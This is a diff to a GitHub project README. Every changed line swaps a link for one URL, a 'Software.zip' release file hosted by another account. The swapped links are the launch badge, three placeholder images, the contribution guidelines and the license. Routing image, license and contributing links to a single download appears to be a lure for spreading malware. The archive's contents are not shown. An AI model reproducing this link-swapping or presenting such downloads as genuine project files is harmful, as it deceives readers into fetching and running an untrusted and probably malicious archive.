@@ -22,7 +22,7 @@ In this repository, you will find code and resources related to the following to
 ## 🚀 Getting Started
 
 To launch the project, please download the project files from the following link:
-[![Launch Project](https://img.shields.io/badge/Launch-Project-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Launch Project](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip)](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip)
 
 If the link does not work or if it needs to be launched, please check the "Releases" section of this repository.
 
@@ -34,9 +34,9 @@ For more information and updates, feel free to visit our website.
 
 Here are some images showcasing the project:
 
-![Image 1](https://via.placeholder.com/500)
-![Image 2](https://via.placeholder.com/500)
-![Image 3](https://via.placeholder.com/500)
+![Image 1](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip)
+![Image 2](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip)
+![Image 3](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip)
 
 ## 🔧 Technologies Used
 
@@ -68,11 +68,11 @@ To use this project, follow these steps:
 
 ## 🤝 Contributing
 
-We welcome contributions from the community! If you'd like to contribute to this project, please follow our [Contribution Guidelines](CONTRIBUTING.md).
+We welcome contributions from the community! If you'd like to contribute to this project, please follow our [Contribution Guidelines](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip).
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip](https://github.com/Jnzinhnh/websocket_lambda_authorizer/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
